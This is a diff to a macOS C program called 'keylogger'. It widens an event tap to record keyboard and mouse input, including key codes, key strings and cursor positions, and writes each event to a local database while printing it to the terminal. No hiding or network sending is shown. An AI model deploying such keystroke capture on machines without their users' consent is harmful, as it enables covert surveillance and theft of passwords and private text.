@@ -8,20 +8,37 @@
 /**********************************/
 #include "keylogger.h"
 /**********************************/
-CFArrayRef windowList;
-volatile unsigned int windows_qty = 0;
-/**********************************/
+static bool IsMouseEvent(CGEventType type);
+
+static volatile CFArrayRef windowList;
+volatile unsigned int      windows_qty    = 0;
+static volatile CGPoint    mouse_location = { .x = 0, .y = 0, };
 volatile unsigned long
-  events_qty       = 0,
-  started          = 0,
-  mouse_events_qty = 0,
-  kb_events_qty    = 0
+                           events_qty = 0,
+  started                             = 0,
+  mouse_events_qty                    = 0,
+  kb_events_qty                       = 0
 ;
+static keylogger_stats_t *kl;
+static bool              was_icanon = false, exited = false;
 
 
-keylogger_stats_t *kl;
-bool              was_icanon = false;
-bool              exited     = false;
+/**********************************/
+static bool IsMouseEvent(CGEventType type) {
+  return(type == kCGEventLeftMouseDown
+         || type == kCGEventLeftMouseUp
+         || type == kCGEventRightMouseDown
+         || type == kCGEventLeftMouseDragged
+         || type == kCGEventRightMouseDragged
+         || type == kCGEventRightMouseUp
+         || type == kCGEventMouseMoved
+         || type == kCGEventOtherMouseUp
+         || type == kCGEventOtherMouseDown
+         || type == kCGEventOtherMouseDragged
+         || type == kCGEventLeftMouseDragged
+         || type == kCGEventScrollWheel
+         || type == kCGEventRightMouseDragged);
+}
 
 
 void __at_exit(void){
@@ -58,9 +75,8 @@ void __at_exit(void){
                                       kl->qty->any       = 0;                                 \
                                     } while (0); }
 
-CGPoint     mouse_location;
 /**********************************/
-CGEventMask mouse_and_kb_events = (
+static volatile CGEventMask mouse_and_kb_events = (
   ///////////////////////////////////////
   CGEventMaskBit(kCGEventKeyDown)
   | CGEventMaskBit(kCGEventKeyUp)
@@ -71,6 +87,10 @@ CGEventMask mouse_and_kb_events = (
   | CGEventMaskBit(kCGEventRightMouseDown)
   | CGEventMaskBit(kCGEventRightMouseUp)
   | CGEventMaskBit(kCGEventMouseMoved)
+  | CGEventMaskBit(kCGEventOtherMouseDown)
+  | CGEventMaskBit(kCGEventOtherMouseUp)
+  | CGEventMaskBit(kCGEventOtherMouseDragged)
+  | CGEventMaskBit(kCGEventScrollWheel)
   | CGEventMaskBit(kCGEventLeftMouseDragged)
   | CGEventMaskBit(kCGEventRightMouseDragged)
   ///////////////////////////////////////
@@ -120,6 +140,7 @@ int init(){
   INIT_KEYLOGGER_STATS();
   started = timestamp();
   assert(keylogger_init_db() == 0);
+  assert(keylogger_create_db() == 0);
   mouse_location = CGEventGetLocation(event_handler);
   return(0);
 }
@@ -131,24 +152,40 @@ int init(){
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
   kl->times->ts = timestamp();
   kl->qty->any++;
+
+  uint64_t TS = (uint64_t)CGEventGetTimestamp(event);
+  PRINT((size_t)TS);
+
   bool
        key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown)
   ;
-  char *action = "";
+  char *action = "UNKNOWN";
+  bool
+       is_mouse = IsMouseEvent(type),
+    is_keyboard = is_mouse ? false : true;
+
+  CGKeyCode keyCode = 0;
+  char      *ckc    = "UNKNOWN";
+  if (is_mouse) {
+    mouse_location = CGEventGetLocation(event);
+    if (CGEventGetIntegerValueField(event, kCGMouseEventButtonNumber) < UINT16_MAX) {
+      uint16_t button = (uint16_t)CGEventGetIntegerValueField(event, kCGMouseEventButtonNumber) + 1;
+      keyCode = button;
+    }
+  }else{
+    keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    ckc     = convertKeyCode(keyCode);
+  }
 
   if (key_up) {
     action = "UP";
   }else if (key_down) {
     action = "DOWN";
-  }else{
-    action = "UNKNOWN";
   }
 
-  CGKeyCode  keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-  const char *ckc    = convertKeyCode(keyCode);
   kl->since->any = (kl->qty->any > 0) ?  (kl->times->ts - kl->times->last) : (0);
 
-  fprintf(stdout, "%s", AC_CLS);
+//  fprintf(stdout, "%s", AC_CLS);
   PRINT("<", kl->times->ts, ">",
         "\n\t  | keycode: ", keyCode, "| action:", action, "|", (char *)ckc,
         "\n\t  | last:", kl->times->last,
@@ -156,9 +193,17 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         "\n\t  | any qty:", kl->qty->any
         );
   kl->times->last = kl->times->ts;
+
+
   keylogger_insert_db_row(&(logged_key_event_t){
-    .ts  = timestamp(),
-    .qty = 5,
+    .ts         = (unsigned long)CGEventGetTimestamp(event),
+    .qty        = 1,
+    .key_code   = (unsigned long)keyCode,
+    .key_string = (char *)strdup(ckc),
+    .action     = (char *)strdup(action),
+    .mouse_x    = (unsigned long)mouse_location.x,
+    .mouse_y    = (unsigned long)mouse_location.y,
+    .input_type = is_mouse ? "mouse" : (is_keyboard ? "keyboard" : "UNKNOWN"),
   });
 
   return(event);
